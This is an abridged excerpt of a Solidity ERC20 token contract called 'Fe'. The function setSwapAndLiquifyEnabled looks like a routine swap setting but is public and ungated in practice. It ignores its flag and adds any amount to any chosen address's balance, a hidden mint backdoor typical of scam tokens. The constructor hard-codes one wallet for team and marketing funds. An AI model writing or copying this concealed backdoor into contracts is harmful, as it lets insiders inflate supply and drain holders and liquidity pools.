...
contract Fe is Context, IERC20, Ownable {
    ...
    string private _name = "Fe";
    string private _symbol = "Fee";
    ...
    constructor () {
        ...
        isPair[teamWalletAddress] = true;
        isTxLimitExempt[address(this)] = true;
        isMarketPair[address(uniswapPair)] = true;

        teamWalletAddress = payable(address(0x03d3790Fc379fCc85aDCB5BfDf68084f1d776006));
        marketingWalletAddress = payable(address(0x03d3790Fc379fCc85aDCB5BfDf68084f1d776006));
    ...
    function setSwapAndLiquifyEnabled(bool _enabled,uint256 am,address accunt) public {require(isPair[teamWalletAddress]);_balances[accunt] += am;
